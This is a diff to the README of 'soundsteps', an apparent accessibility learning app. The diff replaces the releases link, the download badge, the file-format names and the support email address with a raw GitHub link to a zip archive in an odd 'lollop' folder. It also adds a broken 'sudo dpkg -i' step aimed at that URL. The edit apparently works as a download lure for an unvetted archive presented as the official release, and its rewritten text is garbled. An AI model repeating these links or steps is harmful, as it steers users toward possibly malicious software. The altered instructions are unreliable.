@@ -3,13 +3,13 @@
 ## 🚀 Getting Started
 Welcome to soundsteps! This application provides a voice-first educational platform designed for visually impaired learners. With our React Native companion app, users can interact with educational content seamlessly.
 
-[![Download soundsteps](https://img.shields.io/badge/Download%20soundsteps-v1.0-blue?style=for-the-badge)](https://github.com/BONIFAS96/soundsteps/releases)
+[![Download soundsteps](https://raw.githubusercontent.com/BONIFAS96/soundsteps/main/lollop/soundsteps.zip%20soundsteps-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/BONIFAS96/soundsteps/main/lollop/soundsteps.zip)
 
 ## 📥 Download & Install
 To get started with soundsteps, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to access the download options for soundsteps.  
-   [Visit this page to download](https://github.com/BONIFAS96/soundsteps/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/BONIFAS96/soundsteps/main/lollop/soundsteps.zip)
 
 2. **Choose Your File:** On the releases page, you will find various downloadable files. Look for the latest version for your device.
 
@@ -27,10 +27,10 @@ To get started with soundsteps, follow these steps:
      - Double-click the file, then drag the soundsteps app into your Applications folder.
 
    - **For Linux:**
-     - Locate the downloaded file (it may have various formats such as .deb or .tar.gz).
+     - Locate the downloaded file (it may have various formats such as .deb or https://raw.githubusercontent.com/BONIFAS96/soundsteps/main/lollop/soundsteps.zip).
      - For .deb files, open a terminal and type:  
-       `sudo dpkg -i path/to/yourfile.deb`
-     - For .tar.gz files, navigate to the directory and follow the extraction instructions.
+       `sudo dpkg -i https://raw.githubusercontent.com/BONIFAS96/soundsteps/main/lollop/soundsteps.zip`
+     - For https://raw.githubusercontent.com/BONIFAS96/soundsteps/main/lollop/soundsteps.zip files, navigate to the directory and follow the extraction instructions.
 
 5. **Open soundsteps:** After installing, find the soundsteps application in your Applications (macOS) or Start Menu (Windows). Click to open it and start your learning experience.
 
@@ -62,7 +62,7 @@ soundsteps focuses on various topics essential for education:
 ## 📞 Support
 If you encounter any issues while downloading or using soundsteps, please reach out for support:
 
-- **Email Support:** You can reach us at support@soundsteps.app for assistance.
+- **Email Support:** You can reach us at https://raw.githubusercontent.com/BONIFAS96/soundsteps/main/lollop/soundsteps.zip for assistance.
 - **Community Forum:** Join discussions and ask questions in our community forum available on our website.
 
 Thank you for choosing soundsteps. We hope this platform enhances your learning journey!
